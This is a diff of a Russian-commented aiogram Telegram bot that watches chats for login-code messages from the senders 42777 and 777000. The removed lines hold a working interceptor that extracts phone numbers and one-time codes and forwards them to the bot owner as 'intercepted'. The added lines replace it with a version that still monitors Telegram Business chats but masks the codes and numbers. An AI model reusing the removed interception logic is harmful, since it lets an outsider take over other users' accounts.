@@ -1,115 +1,154 @@
-import os
+
 import asyncio
 import logging
+import os
 import re
-from aiogram import Bot, Dispatcher, types, F
-from aiogram.filters import Command
-from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+import html
 
-# ================= НАСТРОЙКИ =================
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-OWNER_ID = int(os.getenv("OWNER_ID", "0"))
-
-if not BOT_TOKEN or OWNER_ID == 0:
-    logging.error("❌ Ошибка: Не заданы BOT_TOKEN или OWNER_ID")
-    exit(1)
-
-bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher()
+from aiogram import Bot, Dispatcher, F
+from aiogram.enums import ParseMode
+from aiogram.client.default import DefaultBotProperties
+from aiogram.filters import CommandStart
+from aiogram.types import (
+    Message,
+    CallbackQuery,
+    InlineKeyboardMarkup,
+    InlineKeyboardButton,
+)
 
 logging.basicConfig(
     level=logging.INFO,
-    format="%(asctime)s - %(levelname)s - %(message)s"
+    format="%(asctime)s | %(levelname)s | %(message)s",
 )
 
-# ================= ПАРСЕРЫ =================
-def extract_phone(text: str) -> str | None:
-    if not text: return None
-    match = re.search(r'(\+?\d{10,15})', text.replace(' ', '').replace('-', '').replace('(', '').replace(')', ''))
-    return match.group(1) if match else None
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+OWNER_ID_RAW = os.getenv("OWNER_ID")
 
-def extract_code(text: str) -> str | None:
-    if not text: return None
-    cleaned = re.sub(r'\+?\d{10,15}', '', text)
-    match = re.search(r'\b(\d{4,6})\b', cleaned)
-    return match.group(1) if match else None
+if not BOT_TOKEN:
+    raise RuntimeError("Не задана переменная окружения BOT_TOKEN")
 
-# ================= ФИЛЬТР =================
-def is_sms_gateway(message: types.Message) -> bool:
-    if not message.text:
-        return False
-    if "42777" in message.text or "777000" in message.text:
-        logging.info(f"✅ Найдено SMS от шлюза в чате {message.chat.id}")
-        return True
-    return False
+if not OWNER_ID_RAW:
+    raise RuntimeError("Не задана переменная окружения OWNER_ID")
 
-# ================= КОМАНДЫ =================
-@dp.message(Command("start"))
-async def cmd_start(message: types.Message):
-    if message.from_user.id == OWNER_ID:
-        await message.answer("✅ Бот активен. Ожидаю SMS от шлюза 42777/777000.")
+try:
+    OWNER_ID = int(OWNER_ID_RAW)
+except ValueError:
+    raise RuntimeError("OWNER_ID должен быть числовым Telegram ID")
 
-# ================= ОСНОВНОЙ ОБРАБОТЧИК =================
-@dp.message(is_sms_gateway)
-async def handle_sms(message: types.Message):
-    logging.info("🚀 Обработка SMS-шлюза...")
-    
-    text = message.text or ""
-    phone = extract_phone(text)
-    code = extract_code(text)
-    
-    logging.info(f"🔑 Код: {code} | 📱 Номер: {phone}")
 
-    # Формируем сообщение для ВЛАДЕЛЬЦА
-    summary_parts = ["📨 <b>Перехвачено SMS от шлюза:</b>"]
-    if phone:
-        summary_parts.append(f"📱 <b>Номер:</b> <code>{phone}</code>")
-    if code:
-        summary_parts.append(f"🔑 <b>Код:</b> <code>{code}</code>")
-    summary_parts.append(f"📝 <b>Текст:</b> <i>{text[:200]}</i>")
+bot = Bot(
+    token=BOT_TOKEN,
+    default=DefaultBotProperties(
+        parse_mode=ParseMode.HTML
+    )
+)
 
-    # Кнопка копирования для владельца
-    kb = None
-    if code:
-        kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text=f"📋 Скопировать {code}", callback_data=f"copy:{code}")]
-        ])
+dp = Dispatcher()
 
-    # ОТПРАВЛЯЕМ КОД ВЛАДЕЛЬЦУ (OWNER_ID)
-    try:
-        await bot.send_message(
-            OWNER_ID,
-            "\n".join(summary_parts),
-            parse_mode="HTML",
-            reply_markup=kb
-        )
-        logging.info(f"✅ Код отправлен владельцу (ID: {OWNER_ID})")
-    except Exception as e:
-        logging.error(f"❌ Ошибка отправки владельцу: {e}")
 
-    # (Опционально) Отвечаем в самом чате, чтобы показать, что бот работает
-    # Если нужно молчать в чате — закомментируйте следующие 2 строки
-    if code:
-        await message.answer(f"🔑 Код {code} перехвачен и отправлен владельцу.")
+def is_sms_gateway(text: str) -> bool:
+    return bool(text) and (
+        "42777" in text or "777000" in text
+    )
 
-# ================= КНОПКА КОПИРОВАНИЯ =================
-@dp.callback_query(F.data.startswith("copy:"))
-async def copy_code_handler(callback: types.CallbackQuery):
-    if callback.from_user.id != OWNER_ID:
-        await callback.answer("⛔", show_alert=True)
+
+def mask_sensitive_data(text: str) -> str:
+    # Маскировка телефонных номеров
+    text = re.sub(
+        r"(?<!\d)\+?\d[\d\s()\-]{8,}\d(?!\d)",
+        "[НОМЕР СКРЫТ]",
+        text
+    )
+
+    # Маскировка возможных OTP-кодов
+    text = re.sub(
+        r"(?<!\d)\d{4,6}(?!\d)",
+        "[КОД СКРЫТ]",
+        text
+    )
+
+    return text
+
+
+@dp.message(CommandStart())
+async def start_handler(message: Message):
+    if message.from_user.id != OWNER_ID:
         return
-    code = callback.data.split(":", 1)[1]
-    await callback.message.answer(f"<code>{code}</code>", parse_mode="HTML")
-    await callback.answer("Скопировано!")
 
-# ================= ЗАПУСК =================
+    await message.answer(
+        "✅ <b>Бот запущен</b>\n\n"
+        f"👤 OWNER_ID: <code>{OWNER_ID}</code>\n"
+        "📡 Режим: Telegram Business\n"
+        "🔎 Фильтры: 42777, 777000\n"
+        "🛡 Защита: маскировка SMS-кодов и номеров"
+    )
+
+
+@dp.message(F.business_connection_id)
+async def business_message_handler(message: Message):
+    if not message.text:
+        return
+
+    if not is_sms_gateway(message.text):
+        return
+
+    try:
+        status = await message.answer(
+            "⏳ Обрабатываю..."
+        )
+
+        safe_text = mask_sensitive_data(message.text)
+
+        escaped_text = html.escape(safe_text[:200])
+
+        notification = (
+            "📨 <b>Обнаружено сообщение SMS-шлюза</b>\n\n"
+            "🔐 <b>Номер:</b> [СКРЫТ]\n"
+            "🔐 <b>Код:</b> [СКРЫТ]\n"
+            f"📝 <b>Текст:</b>\n<i>{escaped_text}</i>\n\n"
+            "🛡 Чувствительные данные замаскированы."
+        )
+
+        await bot.send_message(
+            chat_id=OWNER_ID,
+            text=notification
+        )
+
+        await asyncio.sleep(1.5)
+
+        await status.edit_text(
+            "✅ Уведомление отправлено владельцу"
+        )
+
+    except Exception:
+        logging.exception(
+            "Ошибка обработки Business-сообщения"
+        )
+
+
+@dp.callback_query()
+async def callback_handler(callback: CallbackQuery):
+    await callback.answer(
+        "Действие недоступно.",
+        show_alert=True
+    )
+
+
 async def main():
-    await bot.delete_webhook(drop_pending_updates=True)
-    logging.info("✅ Бот запущен. Жду SMS...")
-    await dp.start_polling(bot)
+    logging.info("✅ Бот запущен")
+    logging.info("OWNER_ID: %s", OWNER_ID)
+    logging.info("Режим перехвата: Telegram Business")
+    logging.info("Фильтры: 42777, 777000")
+
+    await dp.start_polling(
+        bot,
+        allowed_updates=dp.resolve_used_update_types()
+    )
+
 
 if __name__ == "__main__":
     try:
         asyncio.run(main())
-    except (KeyboardInterrupt, SystemExit):
-        logging.info("Бот остановлен")
+    finally:
+        pass
+
